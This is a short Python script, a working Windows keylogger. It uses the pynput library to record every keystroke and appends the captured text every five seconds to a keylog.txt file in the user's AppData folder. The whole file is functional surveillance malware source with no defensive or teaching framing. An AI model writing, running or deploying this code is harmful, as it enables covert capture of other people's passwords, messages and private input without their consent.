#!/usr/bin/python

import pynput.keyboard
import threading
import os

keys = ""

#specify the path of the location for creation of key log file.
path = os.environ['appdata'] + "\\keylog.txt"

def process_keys(key):
	global keys
	try:
		keys = keys + str(key.char)
	except AttributeError:
		if key == key.space:
			keys = keys + " "
		else:
			keys = keys + " " + str(key) + " "

def report():
	global keys
	global path
	with open(path,'a') as file:
		file.write(keys)
		keys = ""
		file.close()
	timer = threading.Timer(5,report)
	timer.start()

def start_keylogger():
	keyboard_listener = pynput.keyboard.Listener(on_press = process_keys)
	with keyboard_listener:
		report()
		keyboard_listener.join()

start_keylogger()

